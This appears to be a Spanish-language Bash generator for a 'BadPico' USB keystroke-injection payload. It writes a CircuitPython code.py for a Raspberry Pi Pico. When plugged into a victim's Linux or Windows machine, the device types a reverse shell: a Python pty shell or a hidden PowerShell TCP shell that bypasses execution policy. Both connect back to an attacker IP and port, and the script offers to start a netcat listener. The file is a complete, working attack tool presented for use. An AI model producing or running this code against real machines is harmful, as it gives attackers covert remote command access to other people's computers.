#!/bin/bash

# --- COLORES ---
GN='\e[32m'
YL='\e[33m'
RD='\e[31m'
BL='\e[34m'
NC='\e[0m'

# --- DEPENDENCIAS ---
check_deps() {
    clear
    echo -e "${BL}[*]${NC} Comprobando dependencias..."
    dependencies=(xterm nc python3)
    for dep in "${dependencies[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${RD}[X]${NC} Falta: $dep. Instala con: sudo apt install xterm netcat -y"
            exit 1
        fi
    done
}

header() {
    clear
    echo -e "${BL}##################################################${NC}"
    echo -e "${BL}#${NC} ${GN}BadPico v3.5 - Custom Config & Multi-OS${NC}       ${BL}#${NC}"
    echo -e "${BL}##################################################${NC}"
}

check_deps

# --- CONFIGURACIÓN DE RED ---
AUTO_IP=$(hostname -I | awk '{print $1}')
TARGET_IP=$AUTO_IP
TARGET_PORT="4444"

header
echo -e "${YL}[?]${NC} Configuración de red actual:"
echo -e "    IP: ${GN}$TARGET_IP${NC} (Auto-detectada)"
echo -e "    Puerto: ${GN}$TARGET_PORT${NC}"
echo ""
echo -e "1) Usar configuración por defecto"
echo -e "2) Personalizar IP y Puerto"
read -p "Opción > " net_opt

if [ "$net_opt" == "2" ]; then
    read -p "Introduce la IP del atacante: " TARGET_IP
    read -p "Introduce el Puerto: " TARGET_PORT
fi

# --- SELECCIÓN DE S.O. ---
header
echo -e "IP: ${GN}$TARGET_IP${NC} | Puerto: ${GN}$TARGET_PORT${NC}"
echo -e "--------------------------------------------------"
echo -e "${YL}[1]${NC} Selecciona el Sistema Operativo víctima:"
echo -e "   1) Linux"
echo -e "   2) Windows (PowerShell Hidden)"
read -p "Opción > " os_opt

# --- SELECCIÓN DE IDIOMA ---
header
echo -e "${YL}[2]${NC} Selecciona el idioma del teclado víctima:"
echo -e "   1) Español (ES)"
echo -e "   2) Inglés (US)"
read -p "Opción > " lang_opt

if [ "$lang_opt" == "1" ]; then
    LAYOUT_IMPORT="from adafruit_hid.keyboard_layout_win_es import KeyboardLayout"
    LAYOUT_CLASS="KeyboardLayout(kbd)"
else
    LAYOUT_IMPORT="from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS"
    LAYOUT_CLASS="KeyboardLayoutUS(kbd)"
fi

# --- GENERACIÓN DE COMANDOS ---
if [ "$os_opt" == "1" ]; then
    # LINUX
    SHORTCUT="Keycode.CONTROL, Keycode.ALT, Keycode.T"
    SLEEP="2.0"
    CMD="python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$TARGET_IP\\\",$TARGET_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")' & exit"
else
    # WINDOWS
    SHORTCUT="Keycode.GUI, Keycode.R"
    SLEEP="0.8"
    CMD="powershell -W Hidden -NoP -Exec Bypass -Command \\\"\$c=New-Object System.Net.Sockets.TCPClient('$TARGET_IP',$TARGET_PORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$st=([adsi]'').System.Management.Automation.Utils.GetPowerShell(0);\$st.AddScript(\$d);\$st.AddCommand('out-string');\$r=\$st.Invoke();\$sb=\$r+'PS '+(pwd).Path+'> ';\$sm=([text.encoding]::ASCII).GetBytes(\$sb);\$s.Write(\$sm,0,\$sm.Length);\$s.Flush()};\$c.Close()\\\""
fi

# --- GENERACIÓN DEL ARCHIVO code.py ---
cat << EOF > code.py
import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
$LAYOUT_IMPORT

kbd = Keyboard(usb_hid.devices)
layout = $LAYOUT_CLASS

time.sleep(5)

kbd.press($SHORTCUT)
time.sleep(0.1)
kbd.release_all()

time.sleep($SLEEP)
layout.write('$CMD')
time.sleep(0.5)
kbd.send(Keycode.ENTER)
EOF

header
echo -e "${GN}[OK]${NC} Script generado para $TARGET_IP:$TARGET_PORT"
echo -e ""
read -p "¿Deseas iniciar el receptor en el puerto $TARGET_PORT? (s/n) > " nc_confirm

if [ "$nc_confirm" == "s" ]; then
    xterm -hold -T "LISTENER $TARGET_PORT" -e "nc -lvnp $TARGET_PORT" &
fi

echo -e "\n${GN}¡Listo!${NC} Pasa el 'code.py' a tu Raspberry Pi Pico."
